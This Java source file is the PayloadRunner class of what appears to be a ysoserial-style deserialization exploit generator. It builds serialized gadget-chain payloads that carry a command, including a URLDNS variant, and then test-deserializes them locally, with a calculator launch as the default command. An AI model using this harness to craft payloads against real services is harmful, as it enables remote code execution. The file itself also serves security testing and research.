package com.ppp.secmgr;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.ObjectPayloadBuilder;
import com.ppp.chain.urldns.DNSHelper;
import com.ppp.enums.Output;
import com.ppp.enums.SerializationType;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Deserializer;

import java.io.File;
import java.util.concurrent.Callable;

/**
 * @author Whoopsunix
 */
public class PayloadRunner {
    public static void run(final Class<? extends ObjectPayload> clazz, final String[] args) throws Exception {
        run(clazz, args, null);
    }

    public static void run(final Class<? extends ObjectPayload> clazz, final String[] args, final SinksHelper sinksHelper) throws Exception {
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> object = clazz.newInstance();

                SinksHelper helper;
                String sink = clazz.getAnnotation(Sink.class).value()[0];
                if (sinksHelper == null) {
                    SinksHelper sinksHelper = new SinksHelper();
                    sinksHelper.setSink(sink);
                    sinksHelper.setEnchant(EnchantType.DEFAULT);
                    sinksHelper.setCommand(command);
                    helper = sinksHelper;
                } else {
                    helper = sinksHelper;
                }
                if (helper.getJavaClassHelper() == null) {
                    JavaClassHelper javaClassHelper = new JavaClassHelper();
                    helper.setJavaClassHelper(javaClassHelper);
                }

                // 增强功能
                if (!sink.equals(Sink.TemplatesImpl)
                        && !sink.equals(Sink.InvokerTransformer3)
                        && !sink.equals(Sink.C3P0))
                    SinkScheduler.builder(helper);

                final Object objBefore = object.getObject(helper);
                helper.setSerialization(SerializationType.UTF8Mix);
//                sinksHelper.setOutput(Output.Base64);
                byte[] ser = ObjectPayloadBuilder.original(objBefore, helper);
                ObjectPayloadBuilder.save(ser, helper);

                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            System.out.println("byte length: " + serialized.length);
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * URLDNS todo
     */
    public static void run(final Class<? extends ObjectPayload> clazz, final DNSHelper dnsHelper) throws Exception {
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {

                dnsHelper.getHost();

                ObjectPayload<?> object = clazz.newInstance();

                SinksHelper sinksHelper = new SinksHelper();
                sinksHelper.setSink(clazz.getAnnotation(Sink.class).value()[0]);
                sinksHelper.setDnsHelper(dnsHelper);


                if (sinksHelper.getJavaClassHelper() == null) {
                    JavaClassHelper javaClassHelper = new JavaClassHelper();
                    sinksHelper.setJavaClassHelper(javaClassHelper);
                }

                final Object objBefore = object.getObject(sinksHelper);
                byte[] ser = ObjectPayloadBuilder.original(objBefore, sinksHelper);

//                System.out.println("serializing payload");
//                byte[] ser = null;
//                if (objBefore instanceof byte[]) {
//                    ser = (byte[]) objBefore;
//                    System.out.println("Serialized payload is a byte array. " +
//                            "Make sure you have configured a stream handler that can handle it");
//                } else {
//                    ser = Serializer.serialize(objBefore);
//                    String base64 = Serializer.serializeBase64(objBefore);
//                    System.out.println(base64);
//                }

                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            System.out.println("byte length: " + serialized.length);
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static String getDefaultTestCmd() {
        return "open -a Calculator.app";
//        return getFirstExistingFile(
//                "C:\\Windows\\System32\\calc.exe",
//                "/Applications/Calculator.app/Contents/MacOS/Calculator",
//                "/System/Applications/Calculator.app/Contents/MacOS/Calculator",
//                "/usr/bin/gnome-calculator",
//                "/usr/bin/kcalc"
//        );
    }

    private static String getFirstExistingFile(String... files) {
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }
}
